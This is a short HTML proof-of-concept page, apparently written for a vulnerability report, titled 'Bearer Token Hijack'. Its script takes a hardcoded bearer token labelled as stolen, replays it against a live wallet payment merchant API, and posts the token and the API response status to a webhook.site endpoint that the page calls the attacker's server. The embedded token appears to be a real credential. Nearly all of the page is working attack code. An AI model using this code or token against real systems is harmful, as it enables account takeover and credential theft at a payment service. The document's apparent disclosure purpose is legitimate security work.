<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: Token Hijack</title>
</head>
<body>
  <h1>PoC: Bearer Token Hijack</h1>
  <p>Open console (F12) and check the logs.</p>

<script>
  alert("‚úÖ PoC page loaded.");
  console.log("üí° Script started");

  const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA";

  // Hit the target API
  fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
    method: "GET",
    headers: {
      "Authorization": stolenToken,
      "Accept": "application/json"
    }
  })
  .then(response => {
    console.log("‚úÖ API Request sent. Status:", response.status);

    // Proof of exfiltration - simulate leak to attacker's server
    return fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        token: stolenToken,
        merchantApiStatus: response.status,
        msg: "Token used from external origin."
      })
    });
  })
  .then(() => {
    console.log("üì° Webhook exfiltration attempted.");
  })
  .catch(err => {
    console.error("‚ùå Script error:", err);
  });
</script>
</body>
</html>
